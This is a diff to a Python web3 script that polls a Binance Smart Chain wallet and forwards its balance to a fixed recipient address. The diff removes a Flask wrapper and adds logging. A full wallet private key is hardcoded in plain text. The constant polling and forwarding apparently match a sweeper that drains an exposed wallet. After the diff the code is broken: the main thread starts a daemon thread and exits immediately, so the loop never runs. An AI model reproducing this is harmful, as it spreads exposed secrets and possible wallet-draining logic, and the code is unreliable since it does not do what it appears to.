@@ -36,12 +36,7 @@
 
 import threading
 import time
-import os
 from web3 import Web3
-from flask import Flask
-
-# Initialize Flask app
-app = Flask(__name__)
 
 # Connect to Binance Smart Chain
 w3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org/"))
@@ -51,20 +46,28 @@ private_key = "de15d2f43192f331d7678c0ffa1a271308924ae60661f4bcc055a0179588a8d2"
 pub_key = "0xA9BAF7e3B6A21E24E5450E23C921e60F5F1B99A4"
 recipient_pub_key = "0x9BAbf3490ee292bAbFCcf6DF26475108D88eDfb2"
 
-# Define the loop for sending transactions
 def loop():
     while True:
         try:
-            # Check current balance
             balance = w3.eth.get_balance(pub_key)
-            print(f"Current Balance: {w3.fromWei(balance, 'ether')} BNB")
+            print(f"Fetched Balance: {balance} Wei")
+            balance_bnb = Web3.fromWei(balance, 'ether')  # Corrected this line
+            print(f"Balance in BNB: {balance_bnb} BNB")
             
             # Gas settings
             gas_price = w3.eth.gas_price  # Fetch current gas price dynamically
             gas_limit = 21000
-            
-            # Ensure balance can cover gas cost
             gas_cost = gas_limit * gas_price
+            
+            print(f"Gas Price: {gas_price} Wei")
+            print(f"Gas Cost: {gas_cost} Wei")
+            
+            # Check if balance is sufficient to cover gas cost
+            if balance_bnb <= 0:
+                print("Insufficient funds to send BNB. Waiting...")
+                time.sleep(5)  # Retry after 5 seconds
+                continue
+            
             if balance <= gas_cost:
                 print("Insufficient funds for gas. Waiting...")
                 time.sleep(5)  # Retry after 5 seconds
@@ -89,20 +92,9 @@ def loop():
         except Exception as e:
             print(f"Error: {e}")
         
-        # Reduce sleep time for faster checking (every 5 seconds)
-        time.sleep(5)
-
-# Flask route for checking the status
-@app.route('/')
-def index():
-    return "BNB Transaction Service is Running!"
+        # Avoid overloading the network
+        time.sleep(60)
 
 # Start the loop in a separate thread
 threading.Thread(target=loop, daemon=True).start()
-
-# Ensure app listens on the correct port dynamically
-if __name__ == "__main__":
-    port = os.getenv("PORT", 8080)  # Use Render's dynamic port or fallback to 8080
-    print(f"App is running on port {port}")
-    app.run(host='0.0.0.0', port=port)
 
